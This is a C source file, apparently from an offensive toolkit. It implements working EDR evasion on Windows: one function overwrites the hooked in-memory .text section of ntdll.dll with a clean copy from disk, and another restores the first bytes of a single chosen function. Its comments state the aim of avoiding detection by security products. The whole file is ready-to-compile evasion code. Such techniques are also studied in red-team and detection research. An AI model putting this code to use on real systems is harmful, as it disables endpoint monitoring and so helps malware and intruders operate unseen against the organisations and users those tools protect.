/*
 * Unhooking ntdll.dll — remap clean .text section over hooked one
 *
 * EDRs hook ntdll.dll by patching the first bytes of Nt* functions
 * with JMP instructions to their monitoring code. This module reads
 * a clean copy of ntdll.dll from disk and overwrites the .text
 * section in memory, removing all hooks.
 *
 * Compile: x86_64-w64-mingw32-gcc -c unhook_ntdll.c -o unhook_ntdll.o
 */

#include <windows.h>

/*
 * unhook_ntdll — read clean ntdll from System32, find .text section,
 * and overwrite the in-memory hooked version with the clean copy.
 *
 * Returns TRUE if .text was successfully remapped.
 */
BOOL unhook_ntdll(void) {
    /* 1. Get the in-memory ntdll base address */
    HMODULE ntdll_mem = GetModuleHandleA("ntdll.dll");
    if (!ntdll_mem) return FALSE;

    /* 2. Read clean ntdll from disk */
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat(path, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD file_sz = GetFileSize(hFile, NULL);
    if (file_sz == 0) { CloseHandle(hFile); return FALSE; }

    /* Map the file so we get proper section alignment */
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMapping) return FALSE;

    BYTE *clean_ntdll = (BYTE *)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!clean_ntdll) {
        CloseHandle(hMapping);
        return FALSE;
    }

    /* 3. Parse the in-memory PE to find .text section */
    BYTE *mem_base = (BYTE *)ntdll_mem;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)mem_base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(mem_base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    BOOL success = FALSE;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char *)sec[i].Name, ".text") == 0) {
            BYTE *mem_text = mem_base + sec[i].VirtualAddress;
            BYTE *clean_text = clean_ntdll + sec[i].VirtualAddress;
            DWORD text_sz = sec[i].Misc.VirtualSize;

            /* 4. Change protection to writable */
            DWORD old_protect;
            if (!VirtualProtect(mem_text, text_sz, PAGE_EXECUTE_READWRITE, &old_protect))
                break;

            /* 5. Overwrite hooked .text with clean .text */
            memcpy(mem_text, clean_text, text_sz);

            /* 6. Restore original protection */
            VirtualProtect(mem_text, text_sz, old_protect, &old_protect);

            success = TRUE;
            break;
        }
    }

    UnmapViewOfFile(clean_ntdll);
    CloseHandle(hMapping);
    return success;
}

/*
 * unhook_specific_function — if full .text remap is too aggressive,
 * unhook a single function by restoring its first 16 bytes from disk.
 *
 * Useful when you only need specific syscalls unhooked and want to
 * minimize the chance of EDR detecting a full remap.
 */
BOOL unhook_specific_function(const char *func_name) {
    HMODULE ntdll_mem = GetModuleHandleA("ntdll.dll");
    if (!ntdll_mem) return FALSE;

    BYTE *hooked_addr = (BYTE *)GetProcAddress(ntdll_mem, func_name);
    if (!hooked_addr) return FALSE;

    /* Read clean ntdll from disk (raw, not mapped) */
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat(path, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD file_sz = GetFileSize(hFile, NULL);
    BYTE *raw = (BYTE *)VirtualAlloc(NULL, file_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!raw) { CloseHandle(hFile); return FALSE; }

    DWORD rd;
    ReadFile(hFile, raw, file_sz, &rd, NULL);
    CloseHandle(hFile);

    /* Parse raw PE to find the export */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)raw;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(raw + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    /* Find .text section to compute file offset from RVA */
    DWORD text_rva = 0, text_raw_off = 0, text_sz = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char *)sec[i].Name, ".text") == 0) {
            text_rva = sec[i].VirtualAddress;
            text_raw_off = sec[i].PointerToRawData;
            text_sz = sec[i].SizeOfRawData;
            break;
        }
    }

    if (text_rva == 0) {
        VirtualFree(raw, 0, MEM_RELEASE);
        return FALSE;
    }

    /* The function's RVA relative to ntdll base */
    DWORD func_rva = (DWORD)(hooked_addr - (BYTE *)ntdll_mem);
    /* Convert to file offset */
    DWORD func_file_off = func_rva - text_rva + text_raw_off;

    if (func_file_off >= file_sz || func_file_off + 16 > file_sz) {
        VirtualFree(raw, 0, MEM_RELEASE);
        return FALSE;
    }

    /* Restore first 16 bytes (enough to undo a JMP hook) */
    DWORD old_protect;
    if (VirtualProtect(hooked_addr, 16, PAGE_EXECUTE_READWRITE, &old_protect)) {
        memcpy(hooked_addr, raw + func_file_off, 16);
        VirtualProtect(hooked_addr, 16, old_protect, &old_protect);
        VirtualFree(raw, 0, MEM_RELEASE);
        return TRUE;
    }

    VirtualFree(raw, 0, MEM_RELEASE);
    return FALSE;
}
